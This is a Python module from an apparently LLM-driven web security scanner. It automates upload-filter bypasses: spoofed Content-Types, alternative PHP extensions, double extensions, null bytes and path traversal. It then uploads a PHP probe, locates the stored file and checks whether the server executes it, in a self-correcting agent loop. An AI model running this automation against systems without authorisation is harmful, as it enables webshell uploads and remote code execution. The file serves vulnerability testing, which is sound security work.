"""
模块 4：Webshell 上传绕过与命令执行 (RCE) 验证 (LLM 决策 + 自动纠错循环 Agent 模式)

架构设计：
  1. Strategy Agent: 由 LLM 根据目标环境（URL、表单结构、accept限制）动态生成最佳绕过策略
  2. Request Executor: Python 构建精准的多部分表单 (multipart/form-data) 请求
  3. Path Analysis Agent: LLM 结合智能 DOM 差异对比解析重命名后的 Webshell 真实路径
  4. Diagnostic Agent & Self-Correction Loop: LLM 对 Webshell 响应进行漏洞诊断，若未解析或报错，自动提示纠错建议并进行下一轮重试
"""
import uuid
import urllib.parse
import re
import time
from typing import Dict, Any, List, Optional, Set
from pydantic import BaseModel, Field
from langchain_core.prompts import ChatPromptTemplate
from bs4 import BeautifulSoup

from web_audit.modules.base_module import BaseModule
from web_audit.core.requester import Requester
from web_audit.core.llm_factory import get_structured_llm, get_llm


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Pydantic 结构化输出模型
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class BypassStrategyItem(BaseModel):
    name: str = Field(description="绕过策略名称，例如 'MIME Spoofing', 'PHTML Extension', 'Case Variation'")
    filename_suffix: str = Field(description="建议的文件后缀/扩展名（包含点号），例如 '.php', '.phtml', '.php5', '.phar', '.jpg.php', '.php%00.jpg'")
    content_type: str = Field(description="建议的 Content-Type 标头，例如 'image/jpeg', 'image/png', 'application/x-httpd-php'")
    rationale: str = Field(description="LLM 设计该策略的依据和推理")


class StrategyGenerationResult(BaseModel):
    strategies: List[BypassStrategyItem] = Field(
        description="由 LLM 为当前目标表单定制的 3 到 6 个绕过策略列表，按成功概率从高到低排序。"
    )


class ExtractPathResult(BaseModel):
    extracted_path: Optional[str] = Field(
        description="从上传响应或 DOM 内容中提取出的相对路径或绝对 URL。如果找不到路径则返回 null。",
        default=None
    )
    reason: str = Field(description="提取逻辑与依据说明")


class DiagnosticResult(BaseModel):
    status: str = Field(
        description="诊断状态类别，必须是以下之一: 'SUCCESS' (探针成功解析执行), 'PATH_404' (路径404错误/文件名变动), 'NOT_EXECUTED' (服务器未解析PHP，源码直接暴露/被当作纯文本或图片输出), 'WAF_BLOCKED' (被拦截), 'UNKNOWN' (其他)"
    )
    is_vuln: bool = Field(
        description="是否确凿证明存在安全漏洞（当且仅当探针标志被服务器动态引擎解析执行时为 True）"
    )
    explanation: str = Field(description="诊断依据和详细推理过程")
    recommended_action: str = Field(
        description="针对当前失败原因给出的自动纠错调整建议，例如 '建议更换 .phtml 后缀', '建议到列表页寻找重命名后的文件名'"
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LangChain Prompts
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STRATEGY_GEN_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个顶级 Web 安全专家，专注于文件上传漏洞与绕过测试。
你的任务是根据给定的上传接口信息，分析目标的防御机制（如前端 accept 限制、常见后端语言、中间件容器），动态定制一组最具针对性的绕过策略。

常用绕过思路提示：
1. **Direct Upload**: 基础直接上传 (.php)
2. **MIME Type Spoofing**: 将 Content-Type 伪造为 image/jpeg 或 image/png
3. **Alternative Extensions**: 备选可执行后缀 (.php3, .php5, .phtml, .phar, .inc)
4. **Case Obfuscation**: 大小写混合 (.PhP, .pHtml)
5. **Double Extensions**: 双后缀 (.jpg.php, .png.php)
6. **Null Byte / Path Traversal**: 截断或路径穿越 (../shell.php)

请输出 3 到 6 个结构化的策略组合。"""),
    ("human", """目标上传接口: {action_url}
表单文件字段名: {file_param}
前端声明允许的 accept 类型: {accept_types}
页面标题/上下文: {page_title}

请为该接口生成最有可能绕过防御的策略列表。""")
])


PATH_EXTRACT_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的安全分析助手。我刚在服务器上上传了一个名为 `{filename}` 的文件。
请从下面的 HTTP 响应体中（可能是 JSON, HTML, 或者是包含 JavaScript 的代码）寻找并提取出这个文件被存放在服务器上的最终访问路径。

提取原则：
1. 可能是一个直接的 URL (http://...)
2. 也可能是一个相对路径 (如 /uploads/shell.php, img/avatars/shell.jpg)
3. 或者是 JSON 字段中的路径，如 {{"status":"success", "url":"/uploads/123.php"}}
4. 如果响应只返回了成功但没有路径，或者返回了失败，请返回 null。"""),
    ("human", """响应状态码: {status_code}
文件名: {filename}

【服务器响应内容】:
{response_body}

请提取保存路径。""")
])


DIAGNOSTIC_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的 Web 漏洞诊断与自纠错智能体。
我们在目标服务器上通过文件上传提交了一个探针代码，探针包含原生打印标记 `VULN_VERIFIED_MARKER_UPLOAD`。
现在我们访问了推测的 Webshell 访问路径，请根据返回的 HTTP 响应，严格诊断当前状态：

🔥 **判断标准**:
1. **SUCCESS (漏洞确凿)**:
   - 响应中出现了 `VULN_VERIFIED_MARKER_UPLOAD` 标记，**且**前面没有 `<?php` 或 `<%` 等原始脚本标签。
   - 说明服务器代码解释器（如 PHP/ASP 引擎）成功解析并执行了探针，确认造成了任意代码执行/Webshell 漏洞！

2. **NOT_EXECUTED (代码未解析)**:
   - 响应中虽然出现了 `VULN_VERIFIED_MARKER_UPLOAD`，但同时依然能看到 `<?php` 或 `echo` 源码，说明文件被服务器当作纯文本或图片返回了，未能触发代码解析。
   - 建议：提示纠错模块更换更具兼容性的解析后缀（如 .phtml, .php5）。

3. **PATH_404 (路径错误)**:
   - 响应状态码为 404 或页面提示 File Not Found。说明文件落地路径推算错误，或者服务器对文件进行了重命名。
   - 建议：提示纠错模块从页面 DOM 差异或列表页中寻找新的文件名。

4. **WAF_BLOCKED (被拦截/拒绝)**:
   - 状态码 403/406 或页面提示安全拦截。

请给出严谨的诊断判定以及针对性的自纠错建议。"""),
    ("human", """尝试的 Payload 文件名: {filename}
访问的 Webshell URL: {webshell_url}
HTTP 状态码: {status_code}

【访问 Webshell 得到的响应内容】:
{response_text}

请分析诊断并给出结构化结果。""")
])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 主模块实现：LLM 决策 + 自动纠错循环
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class UnifiedUploadAuditModule(BaseModule):
    name = "unified_upload_audit"

    def __init__(self, requester: Requester):
        super().__init__(requester)

        # 绑定结构化 LLM Chains
        self._strategy_chain = STRATEGY_GEN_PROMPT | get_structured_llm(StrategyGenerationResult)
        self._path_chain = PATH_EXTRACT_PROMPT | get_structured_llm(ExtractPathResult)
        self._diag_chain = DIAGNOSTIC_PROMPT | get_llm().with_structured_output(DiagnosticResult, method="json_mode")

        # PHP 无害探针标记
        self.webshell_content = b"<?php echo 'VULN_VERIFIED_MARKER_UPLOAD'; ?>"

    def run(self, url: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        result = self._base_result(url)
        upload_forms = (context or {}).get("upload_forms", [])

        if not upload_forms:
            result["summary"] = "上下文中没有提供任何上传端点信息"
            return result

        print(f"  [UploadAgent] 启动 LLM 智能决策与自纠错上传漏洞测试 Agent (端点数: {len(upload_forms)})...")

        for form_idx, form in enumerate(upload_forms, 1):
            action_url = form.get("action_url") or url
            file_params = form.get("file_input_names", [])
            file_param = file_params[0] if file_params else "file"
            accept_types = form.get("accepted_types", [])
            source_page = form.get("found_on_page") or form.get("source_url") or action_url

            print(f"\n  [{form_idx}/{len(upload_forms)}] 正在为端点 [{action_url}] 启动 Agent 决策链 (参数: '{file_param}')...")

            # ── 阶段 1: LLM 动态策略生成 ─────────────────────────────
            strategies = self._generate_llm_strategies(
                action_url=action_url,
                file_param=file_param,
                accept_types=accept_types,
                page_title=source_page
            )
            print(f"  [StrategyAgent] LLM 成功生成 {len(strategies)} 组针对性绕过策略。")

            # 收集 baseline DOM 链接（用于上传 POST 后的差异对比）
            observation_pages = self._build_observation_pages(source_page, url, action_url, form)
            baseline_links = self._collect_baseline_links(observation_pages)

            form_vulnerable = False

            # ── 阶段 2 & 3 & 4: LLM 决策执行 + 自纠错循环 ────────────
            for strat_idx, strategy in enumerate(strategies, 1):
                if form_vulnerable:
                    break  # 如果当前表单已经验证成功 RCE，停止尝试后续策略

                strat_name = strategy.name
                suffix = strategy.filename_suffix
                content_type = strategy.content_type
                filename = f"{uuid.uuid4().hex[:6]}_{strat_name.replace(' ', '_')}{suffix}"

                print(f"\n    → [Round {strat_idx}/{len(strategies)}] 执行策略: '{strat_name}' | 文件名: {filename} | Content-Type: {content_type}")
                print(f"       (依据: {strategy.rationale[:70]}...)")

                # 收集表单其他额外隐藏字段
                form_data = self._extract_extra_form_fields(source_page, action_url)

                # 发送物理上传请求
                resp = self._send_upload(action_url, file_param, filename, self.webshell_content, content_type, form_data)
                if not resp:
                    print(f"      [-] 上传请求未收到有效响应，跳过。")
                    continue

                # ── 尝试寻找 Webshell 真实路径 ────────────────────────
                path = self._extract_webshell_path(
                    resp, filename, baseline_links, action_url, strat_name, "", source_page,
                    # 传入 observation_pages：上传阶段已发现的所有后台页面，
                    # 作为"已知可能展示上传文件的页面"进行扫描
                    observation_pages
                )

                if not path:
                    print(f"      [-] 均未能定位上传文件路径，进行下一次策略迭代。")
                    continue

                base_for_join = source_page or action_url or url
                webshell_url = urllib.parse.urljoin(base_for_join, path)
                print(f"      [+] 推演得到 Webshell 目标 URL: {webshell_url}")

                # ── 阶段 4: 访问 Webshell 并发起 LLM 诊断与自纠错 ────
                diag_result = self._verify_and_diagnose(webshell_url, filename)

                if not diag_result:
                    continue

                if diag_result.is_vuln or diag_result.status == "SUCCESS":
                    print(f"\n    🚨🚨 [AGENT 确认漏洞] 策略 '{strat_name}' 突破成功！探针已被动态引擎成功执行！🚨🚨")
                    print(f"    - 分析说明: {diag_result.explanation}")

                    result["findings"].append({
                        "url": action_url,
                        "strategy": strat_name,
                        "payload_file": filename,
                        "shell_path": webshell_url,
                        "rce_output": diag_result.explanation,
                        "severity": "Critical"
                    })
                    form_vulnerable = True
                    break
                else:
                    print(f"      [LLM 诊断状态: {diag_result.status}] {diag_result.explanation[:80]}")
                    print(f"      [💡 自纠错建议]: {diag_result.recommended_action}")

                    # 自动纠错机制：如果诊断提示路径 404，尝试去网络拦截器刷新寻找
                    if diag_result.status == "PATH_404" and form.get("referer_url"):
                        print(f"      [↺ 纠错重试] 尝试触发 Playwright 网络层拦截...")
                        net_urls = self.requester.fetch_network_resources(form.get("referer_url"))

                        # 评分匹配替代原 `filename.split("_")[0]` 前缀匹配 —— 处理重命名场景
                        best_retry, best_retry_score = None, -1
                        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
                        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']

                        for net_u in net_urls:
                            score = 0
                            net_lower = net_u.lower()

                            if any(ud in net_lower for ud in upload_dirs):
                                score += 10
                            if any(ext in net_lower for ext in shell_extensions):
                                score += 10
                            if '?' not in net_lower:
                                score += 3
                            # 原始文件名的任何部分可能仍在（重命名可能截断 UUID 但不一定完全消失）
                            original_parts = set(filename.replace(".", "_").split("_"))
                            if any(p in net_lower for p in original_parts if len(p) >= 3):
                                score += 15

                            if score > best_retry_score:
                                best_retry_score, best_retry = score, net_u

                        if best_retry and best_retry_score >= 15:
                            print(f"      [↺ 纠错重试] 发现网络层新路径: {best_retry} (score={best_retry_score})")
                            retry_diag = self._verify_and_diagnose(best_retry, filename)
                            if retry_diag and (retry_diag.is_vuln or retry_diag.status == "SUCCESS"):
                                print(f"\n    🚨🚨 [AGENT 自动纠错成功] 通过网络层捕获成功定位并解析 Webshell！🚨🚨")
                                result["findings"].append({
                                    "url": action_url,
                                    "strategy": strat_name + " (Self-Correction via Network)",
                                    "payload_file": filename,
                                    "shell_path": best_retry,
                                    "rce_output": retry_diag.explanation,
                                    "severity": "Critical"
                                })
                                form_vulnerable = True
                                break

        result["summary"] = f"LLM 上传漏洞测试完成。发现高危 Webshell/RCE 漏洞: {len(result['findings'])} 个。"
        return result

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 辅助方法与 Agent 环节实现
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def _generate_llm_strategies(self, action_url: str, file_param: str, accept_types: List[str], page_title: str) -> List[BypassStrategyItem]:
        """调用 Strategy Agent 动态生成最佳绕过策略。若 LLM 失败则退回基础备用策略。"""
        try:
            res: StrategyGenerationResult = self._strategy_chain.invoke({
                "action_url": action_url,
                "file_param": file_param,
                "accept_types": ", ".join(accept_types) if accept_types else "无限制",
                "page_title": page_title,
            })
            if res and res.strategies:
                return res.strategies
        except Exception as e:
            print(f"  [StrategyAgent] LLM 生成策略失败 ({e})，降级为默认策略库。")

        # 默认降级策略库
        return [
            BypassStrategyItem(name="Direct PHP", filename_suffix=".php", content_type="application/x-httpd-php", rationale="基础直接上传测试"),
            BypassStrategyItem(name="MIME Spoofing", filename_suffix=".php", content_type="image/jpeg", rationale="Content-Type 伪造为图片"),
            BypassStrategyItem(name="Alternative Ext PHTML", filename_suffix=".phtml", content_type="image/jpeg", rationale="常见可执行扩展名绕过"),
            BypassStrategyItem(name="Alternative Ext PHP5", filename_suffix=".php5", content_type="image/jpeg", rationale="PHP5 拓展名绕过"),
            BypassStrategyItem(name="Case Obfuscation", filename_suffix=".PhP", content_type="image/jpeg", rationale="后缀大小写变异"),
            BypassStrategyItem(name="Double Extension", filename_suffix=".jpg.php", content_type="image/jpeg", rationale="双重后缀绕过"),
        ]

    def _get_post_upload_target_url(self, resp: Any, action_url: str) -> List[str]:
        """
        返回上传 POST 后需要重新渲染抓取 DOM 的候选 URL 列表。

        优先级（最可能包含新 img/src 文件的顺序）：
          1. resp.url        — POST-Redirect-GET 的最终着陆页
          2. resp.request.url — 原始 POST 目标（可能先渲染新链接后重定向）
          3. resp.history...  — 多跳重定向中的中间页
          4. action_url       — 上传表单页自身（最直接的上传后渲染位置）
        """
        candidates: List[str] = []

        # 1. 最终着陆页
        if resp.url:
            candidates.append(resp.url)

        # 2. requests 通过 resp.request 保留原始 POST 目标 URL
        if getattr(resp, "request", None) and resp.request.url:
            req_url = resp.request.url
            if req_url != resp.url and req_url not in candidates:
                candidates.append(req_url)

        # 3. 跳转链中所有中间页
        for h in (resp.history or []):
            if h.url and h.url not in candidates:
                candidates.append(h.url)

        # 4. 上传端点兜底
        if action_url and action_url not in candidates:
            candidates.append(action_url)

        # 按优先级排序：resp.url 第一，action_url 第二，其余追加
        ordered: List[str] = []
        for c in [resp.url, action_url]:
            if c and c in candidates:
                ordered.append(c)
        for c in candidates:
            if c not in ordered:
                ordered.append(c)

        return ordered[:4]  # 最多 4 个目标，保持速度

    def _extract_webshell_path(self, resp: Any, filename: str, baseline_links: Set[str], action_url: str, strat_name: str, original_filename: str = "", source_page: str = "", observation_pages: List[str] = None) -> Optional[str]:
        """
        组合 LLM 响应分析、DOM 差异对比与兜底正则提取真实路径。

        搜索范围按优先级递增：
        1. 上传响应 JSON
        2. 上传接口返回页面 / 上传表单页
        3. 已知页面列表（文件管理、产品列表等可能展示上传文件的页面）
        4. 正则兜底
        """
        path = None

        # 1. LLM 从上传响应中寻找路径
        if len(resp.text) >= 10:
            try:
                extract_res: ExtractPathResult = self._path_chain.invoke({
                    "filename": filename,
                    "status_code": resp.status_code,
                    "response_body": resp.text[:2000]
                })
                if extract_res and extract_res.extracted_path:
                    ep = extract_res.extracted_path.strip()
                    if "/" in ep or "." in ep:
                        print(f"      [LLM PathAgent] 从响应中解析出路径: {ep}")
                        return ep
            except Exception as e:
                pass

        # 2. 上传后重新渲染目标页面，抓取新 DOM 做差异对比
        time.sleep(0.3)
        post_targets = self._get_post_upload_target_url(resp, action_url)
        # ── 新增 ── 加入 source_page：很多 CMS 上传后图片会显示在上传表单页本身，而非接口响应 ─
        if source_page and source_page not in post_targets:
            post_targets.append(source_page)
        after_links: set = set()

        for target in post_targets:
            try:
                html_text = self.requester.fetch_rendered_html(target)
                if html_text:
                    after_links.update(self._extract_all_links(html_text))
            except Exception:
                pass

        new_links_set = after_links - baseline_links

        # 2a. 新路径提取: 启发式 + UUID 部分匹配（处理服务器重命名场景）
        path = self._extract_path_via_dom_diff(new_links_set, baseline_links, filename, resp)

        # 2b. 评分排序兜底（UUID 前缀存在时有效）
        if not path:
            path = self._find_best_shell_path(baseline_links, after_links, filename)
        if not path:
            path = self._find_fallback_shell_path(baseline_links, after_links, strat_name)

        if path:
            print(f"      [DOM Diff] 通过多页对比捕捉到新增资源: {path}")
            return path

        # 4. 正则兜底扫描（在上传响应原文中查找文件名）
        try:
            core_name = filename.split("_")[0]
            match = re.search(r'[\'"]([^\'"]*' + re.escape(core_name) + r'[^\'"]*)[\'"]', resp.text)
            if match:
                path = match.group(1)
                print(f"      [Regex Fallback] 提取到关联文件名路径: {path}")
                return path
        except Exception:
            pass

        # 5. 扫描已知页面列表（observation_pages）寻找上传文件
        # 很多 CMS 上传后文件会显示在后台页面（文件管理器、产品列表等），
        # 而不在上传接口或表单页的响应中。
        if observation_pages:
            print(f"      [已知页面扫描] 扫描 {len(observation_pages)} 个已知页面查找上传文件...")
            shell_exts = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml']
            upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']
            ignore_kw = ["jquery", "bootstrap", "sweetalert", "datatables", "vendor/", "cdn", "jsdelivr", "/js/", "/images/", "/css/"]

            for page_url in observation_pages:
                if not page_url or page_url == source_page or page_url == action_url:
                    continue  # 已扫过
                try:
                    page_html = self.requester.fetch_rendered_html(page_url)
                    if not page_html:
                        continue
                    page_links = self._extract_all_links(page_html)
                    for link in page_links:
                        if any(kw in link.lower() for kw in ignore_kw):
                            continue
                        if any(ud in link.lower() for ud in upload_dirs) and any(
                            ext in link.lower() for ext in shell_exts
                        ):
                            # 如果文件名包含 UUID 前缀则优先返回
                            base_name = link.split('?')[0].rsplit('/', 1)[-1].lower()
                            if original_filename and original_filename.split('_')[0].lower() in base_name:
                                print(f"      [已知页面扫描] 命中 UUID 前缀匹配: {link}")
                                return link
                            # 否则返回第一个上传目录中的可执行文件（大概率就是上传的文件）
                            print(f"      [已知页面扫描] 找到可执行文件: {link}")
                            if original_filename.split('_')[0].lower() not in base_name:
                                continue  # 不是目标文件，继续
                            return link
                except Exception:
                    continue

            # 5b. 如果 UUID 前缀匹配失败，返回上传目录 + 可执行扩展名的第一个结果
            for page_url in observation_pages:
                if not page_url or page_url == source_page or page_url == action_url:
                    continue
                try:
                    page_html = self.requester.fetch_rendered_html(page_url)
                    if not page_html:
                        continue
                    page_links = self._extract_all_links(page_html)
                    for link in page_links:
                        if any(kw in link.lower() for kw in ignore_kw):
                            continue
                        if any(ud in link.lower() for ud in upload_dirs):
                            exts_to_check = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml']
                            if any(ext in link.lower() for ext in exts_to_check):
                                print(f"      [已知页面扫描 5b] 找到上传目录可执行文件: {link}")
                                return link
                except Exception:
                    continue

        return None

    def _extract_path_via_dom_diff(self, new_links_set: set, baseline_links: Set[str],
                                    original_filename: str, resp: Any) -> Optional[str]:
        """
        从新增链接和上传响应 JSON 中提取文件路径。

        策略优先级:
        1. 上传目录 + 可执行扩展名（轻量启发式，最快）
        2. UUID 前缀非严格匹配（容忍部分匹配，应对重命名截断）
        3. 图像混合扩展名（如 shell.jpg.php）
        4. 宽松兜底（任何上传目录中的可执行文件）
        """
        if not new_links_set:
            return None

        # ── 策略 0: 从上传响应 JSON / 文本中提取文件路径 ──
        # 服务端可能返回 JSON: {"success":true,"url":"/uploads/xxx.php"}
        # 或 {"data":{"filename":"xxx.php"},"path":"/uploads/..."}
        json_text = resp.text if hasattr(resp, 'text') else ''
        if len(json_text) > 5 and ('{' in json_text or '[' in json_text):
            try:
                import json
                parsed = json.loads(json_text)
                found_urls = self._extract_urls_from_json(parsed)
                for url in found_urls:
                    # 排除 CDN / JS / Vendor 等静态资源
                    if ("/" in url or "." in url) and not any(
                        kw in url.lower() for kw in ["jquery", "bootstrap", "sweetalert", "datatables",
                        "vendor/", "cdn", "jsdelivr", "/js/", "/images/", "/css/"]
                    ):
                        # 验证包含可执行文件扩展名
                        base_name = url.split('?')[0].rsplit('/', 1)[-1]
                        shell_exts = ['.php', '.phtml', '.php3', '.php4', '.php5',
                                      '.phar', '.jsp', '.jspx', '.shtml', '.asp', '.aspx']
                        if any(base_name.lower().endswith(ext) for ext in shell_exts) or '.' in base_name:
                            print(f"      [DomDiff JSON] 从响应体提取文件路径: {url}")
                            return url
            except (json.JSONDecodeError, ValueError):
                pass
            # JSON 解析失败 → 尝试正则匹配
            import re
            json_paths = re.findall(
                r'(?:url|path|filepath|file_url|source|src|link)\s*[:=]\s*["\x27]([^"\x27]+\.[a-z]+)["\x27]',
                json_text, re.IGNORECASE
            )
            for jp in json_paths:
                if any(ud in jp.lower() for ud in ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']) or any(
                    jp.lower().endswith(ext) for ext in ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
                ):
                    print(f"      [DomDiff JSON Regex] 从响应正文提取路径: {jp}")
                    return jp

        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar',
                            '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
                       '/attachments/', '/user_files/',
                       '/data/', '/storage/']
        image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']

        # ── 策略 1: 上传目录 + 可执行扩展名（强信号） ──
        for link in sorted(new_links_set):
            if any(ud in link.lower() for ud in upload_dirs) and any(ext in link.lower() for ext in shell_extensions):
                print(f"      [DomDiff Heuristic] 上传目录+可执行扩展名: {link}")
                return link

        # ── 策略 2: 图像混合扩展名在上传目录中 (.jpg.php .png.php) ──
        for link in sorted(new_links_set):
            if any(ud in link.lower() for ud in upload_dirs):
                base_name = link.split('?')[0].split('/')[-1]
                # 检查是否有 图片扩展名 + 可执行扩展名的混合后缀
                if any(ext in base_name.lower() for ext in image_exts):
                    # 提取最后一个点号之后的扩展名
                    last_ext = '.' + base_name.split('.')[-1]
                    if any(last_ext in ext for ext in shell_extensions):
                        print(f"      [DomDiff Heuristic] 图像混合扩展名: {link}")
                        return link

        # ── 策略 3: UUID 前缀部分匹配（容忍重命名截断） ──
        # 原文件名 split("_")[0] 是 UUID，重命名后可能被去掉或替换。
        # 尝试: 新文件名包含原 UUID 的部分字符 + 时间戳特征（长数字串）
        uuid_prefix = original_filename.split("_")[0] if "_" in original_filename else ""
        if uuid_prefix and len(uuid_prefix) >= 4:
            for link in sorted(new_links_set):
                # 部分匹配: UUID 前缀的前半部分
                partial = uuid_prefix[:4]
                has_partial = partial in link.lower()
                # 或者新路径包含时间戳特征（连续 8+ 位数字）
                import re
                has_timestamp = bool(re.search(r'\d{8,}', link))
                has_shell_ext = any(ext in link.lower() for ext in shell_extensions)
                if (has_partial or has_timestamp) and has_shell_ext:
                    print(f"      [DomDiff Heuristic] 后缀/时间戳部分匹配: {link} (partial={partial} ts={has_timestamp})")
                    return link

        # ── 策略 4: 任何在上传目录中的可执行扩展名文件（宽松兜底） ──
        for link in sorted(new_links_set):
            if any(ud in link.lower() for ud in upload_dirs):
                if any(ext in link.lower() for ext in shell_extensions):
                    print(f"      [DomDiff Fallback] 上传目录可执行文件: {link}")
                    return link

        return None

    def _verify_and_diagnose(self, webshell_url: str, filename: str) -> Optional[DiagnosticResult]:
        """访问推算出的 Webshell URL，并交给 Diagnostic Agent 进行分析与诊断。"""
        try:
            resp = self.requester.get(webshell_url)
            if not resp:
                return DiagnosticResult(
                    status="PATH_404",
                    is_vuln=False,
                    explanation="访问 Webshell 目标 URL 无响应",
                    recommended_action="检查网络连通性或路径格式"
                )

            # 调用 Diagnostic Agent 进行语义诊断
            diag_res: DiagnosticResult = self._diag_chain.invoke({
                "filename": filename,
                "webshell_url": webshell_url,
                "status_code": resp.status_code,
                "response_text": resp.text[:1500] if resp.text else "(Empty Body)"
            })
            return diag_res

        except Exception as e:
            print(f"      [-] Webshell 验证访问失败: {e}")
            return None

    def _send_upload(self, url: str, param: str, filename: str, content: bytes, content_type: str, data: Dict[str, str]):
        """执行物理上传 POST 请求。"""
        files = {param: (filename, content, content_type)}
        try:
            return self.requester.post(url, files=files, data=data)
        except Exception as e:
            print(f"      [-] 上传 POST 请求异常: {e}")
            return None

    def _extract_all_links(self, html_content: str) -> Set[str]:
        """提取 HTML 中的资源路径与正则表达式提取。"""
        links = set()
        if not html_content: return links
        soup = BeautifulSoup(html_content, "html.parser")
        for tag in soup.find_all(True):
            for attr in ["src", "href", "data-src", "data-url", "data-file"]:
                link = tag.get(attr)
                if link and isinstance(link, str):
                    links.add(link)
        pattern = r'[\'"](/[^ \'"<>\n]+\.[a-zA-Z0-9]+)[\'"]|[\'"](http[^\'"<>\n]+\.[a-zA-Z0-9]+)[\'"]'
        for match in re.findall(pattern, html_content):
            for m in match:
                if m: links.add(m)
        return links

    def _find_best_shell_path(self, before_links: Set[str], after_links: Set[str], original_filename: str) -> Optional[str]:
        """
        评分对比寻找最佳 Webshell 路径 —— 支持服务器重命名场景。

        评分标准（最高分胜出）:
          - 上传目录: +10
          - 可执行扩展名: +10
          - 图像混合扩展名 (.jpg.php / .png.php): +10
          - 路径层级 ≤ 4: +5
          - 无查询字符串: +3
          - UUID 前缀匹配（未重命名场景）: +20

        重命名时: upload_dir(10) + shell_ext(10) = 20 分
        足以高于只有单一扩展名的误报 (10 分)。
        """
        new_links = after_links - before_links
        if not new_links:
            return None

        best_path, max_score = None, -1
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.inc',
                            '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
                       '/attachments/', '/user_files/', '/data/', '/storage/']
        image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']

        uuid_prefix = original_filename.split("_")[0] if "_" in original_filename else ""

        for link in new_links:
            score = 0
            link_lower = link.lower()

            if any(ud in link_lower for ud in upload_dirs):
                score += 10
            if any(ext in link_lower for ext in shell_extensions):
                score += 10
            # 图像混合扩展名（如 shell.jpg.php），配合绕过测试
            if '.' in link:
                base_name = link.split('?')[0].split('/')[-1]
                if any(ext in base_name.lower() for ext in image_exts):
                    score += 10
            # 短路径更可能是直接上传（非深层 CMS 路径）
            if link.count('/') <= 4:
                score += 5
            # 无查询字符串通常表示磁盘上的静态文件
            if '?' not in link:
                score += 3
            # UUID 前缀未丢失时额外 +20
            if uuid_prefix and uuid_prefix in link:
                score += 20

            if score > max_score:
                max_score, best_path = score, link

        return best_path if max_score > 0 else None

    def _find_fallback_shell_path(self, before_links: Set[str], after_links: Set[str],
                                   strat_name: str, _min_score: int = 10) -> Optional[str]:
        """
        宽松兜底：评分排序替代无序 set 的 first-match-wins。
        需要至少一个强信号（上传目录 OR 扩展名）才返回。
        """
        new_links = after_links - before_links
        if not new_links:
            return None

        best_path, max_score = None, -1
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']

        for link in new_links:
            score = 0
            link_lower = link.lower()
            if any(ud in link_lower for ud in upload_dirs):
                score += 5
            if any(ext in link_lower for ext in shell_extensions):
                score += 5
            if score > max_score:
                max_score, best_path = score, link

        return best_path if max_score >= _min_score else None

    def _build_observation_pages(self, source_page: str, url: str, action_url: str, form: Dict[str, Any]) -> List[str]:
        """构建观察页面池。"""
        pages = set([source_page, url, action_url])
        if "?" in source_page:
            pages.add(source_page.split("?")[0])
        if form.get("referer_url"):
            pages.add(form.get("referer_url"))
        for page_url in [url, form.get("referer_url"), form.get("found_on_page")]:
            if page_url:
                parent_dir = urllib.parse.urljoin(page_url, ".")
                if parent_dir: pages.add(parent_dir)
        res = [p for p in pages if p]
        return res[:10]

    def _collect_baseline_links(self, observation_pages: List[str]) -> Set[str]:
        """获取 DOM 基线链接。"""
        baseline_links = set()
        for obs_page in observation_pages:
            try:
                html_text = self.requester.fetch_rendered_html(obs_page)
                if html_text:
                    baseline_links.update(self._extract_all_links(html_text))
            except Exception:
                pass
        return baseline_links

    def _extract_extra_form_fields(self, source_page: str, action_url: str) -> Dict[str, str]:
        """提取普通隐藏字段。"""
        form_data = {}
        try:
            resp = self.requester.get(source_page)
            if resp:
                soup = BeautifulSoup(resp.text, "html.parser")
                for f_tag in soup.find_all("form"):
                    if f_tag.get("action", "") in action_url or action_url in f_tag.get("action", ""):
                        for inp in f_tag.find_all("input"):
                            if inp.get("type", "text") != "file" and inp.get("name"):
                                form_data[inp["name"]] = inp.get("value", "test_val")
                        break
        except Exception:
            pass
        return form_data

    def _extract_urls_from_json(self, obj: Any, depth: int = 0) -> List[str]:
        """
        递归提取 JSON 对象中所有类 URL 的字符串。
        """
        if depth > 10:
            return []
        urls: List[str] = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str) and ('/' in v or 'http' in v.lower()):
                    urls.append(v)
                else:
                    urls.extend(self._extract_urls_from_json(v, depth + 1))
        elif isinstance(obj, list):
            for item in obj:
                urls.extend(self._extract_urls_from_json(item, depth + 1))
        return urls
